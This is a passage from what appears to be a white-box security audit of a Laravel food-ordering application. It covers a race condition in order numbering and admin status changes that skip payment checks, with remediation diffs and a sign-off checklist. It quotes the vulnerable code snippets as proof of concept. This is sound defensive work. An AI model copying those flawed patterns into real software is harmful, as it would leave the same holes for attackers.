// app/Services/OrderNumberService.php:15-26
$latestOrder = Order::where('order_number', 'LIKE', $prefix.'%')
    ->orderByDesc('id')
    ->first(); // Non-atomic check-then-act

if ($latestOrder) {
    $lastSequence = (int) substr($latestOrder->order_number, strlen($prefix));
    $nextSequence = $lastSequence + 1;
} else {
    $nextSequence = 1;
}
```

**Remediation Plan / Unified Diff:**
Acquire an exclusive lock or append a cryptographically random suffix:

```diff
--- a/app/Services/OrderNumberService.php
+++ b/app/Services/OrderNumberService.php
@@ -14,7 +14,7 @@ class OrderNumberService
     public function generate(): string
     {
         $prefix = 'DM-'.Carbon::now()->format('ymd').'-';
-        $latestOrder = Order::where('order_number', 'LIKE', $prefix.'%')
+        $latestOrder = Order::lockForUpdate()->where('order_number', 'LIKE', $prefix.'%')
             ->orderByDesc('id')
             ->first();
```

**Verification Steps:**
- Test command: Run parallel concurrent checkout requests using `curl --parallel`.
- Expected output: All checkouts succeed with unique order numbers; zero `QueryException` duplicate key failures.

---

### SEC-012: Arbitrary Order Status State Machine Violations in Admin Order Controller
- **Severity:** `LOW`
- **Category:** State Machine Integrity
- **Status:** `[ ] Open`
- **Location:** `app/Http/Controllers/Admin/OrderController.php:94-106`, `app/Http/Requests/UpdateOrderStatusRequest.php:19`
- **Description:**
  `UpdateOrderStatusRequest` accepts any integer `in:0,1,2,3,4`.
  In `Admin\OrderController::updateStatus()`, the order's status is directly updated without checking whether the new status is a valid transition from the existing status, or whether payment has been completed.
  
  For example, an order with payment status `Menunggu Pembayaran` or `Ditolak` can be marked directly as `Selesai` (Completed) or `Diproses Dapur` (Processing), bypassing the requirement for verified payment.

**Proof of Concept / Vulnerable Snippet:**
```php
// app/Http/Controllers/Admin/OrderController.php:96-99
$order = Order::findOrFail($id);
$newStatus = (int) $request->input('order_status');

$order->update(['order_status' => $newStatus]); // VULNERABLE: No transition matrix validation
```

**Remediation Plan / Unified Diff:**
Validate state transitions against an allowable transition matrix before updating:

```diff
--- a/app/Http/Controllers/Admin/OrderController.php
+++ b/app/Http/Controllers/Admin/OrderController.php
@@ -96,5 +96,9 @@ class OrderController extends Controller
         $order = Order::findOrFail($id);
         $newStatus = (int) $request->input('order_status');
 
+        if ($newStatus === Order::STATUS_PROCESSING && $order->payment_status !== Order::PAYMENT_PAID) {
+            return back()->with('error', 'Pesanan belum dapat diproses dapur sebelum pembayaran lunas.');
+        }
+
         $order->update(['order_status' => $newStatus]);
```

**Verification Steps:**
- Test command: Send admin status update to set an unpaid order to `Diproses Dapur` or `Selesai`.
- Expected output: Rejection with actionable error message.

---

# Remediation & Sign-off

- [ ] All `CRITICAL` and `HIGH` findings remediated and verified
- [ ] Automated regression test suite passes without regressions
- [ ] Negative security test case added to prevent vulnerability regression
- [ ] Dependencies updated and lockfile integrity verified
- [ ] Final verification scan executed

**Sign-off Record:**
- **Auditor Signature:** `SecurityAuditor`
- **Completion Date:** 2026-11-07
- **Final Note:** Full white-box adversarial review concluded. Immediate remediation of SEC-001 (IDOR PII leak), SEC-002 (Payment hijacking), SEC-003 (File extension handling), SEC-004 (CSV formula injection), and SEC-005 (Delivery fee spoofing) is strictly recommended before any public deployment.
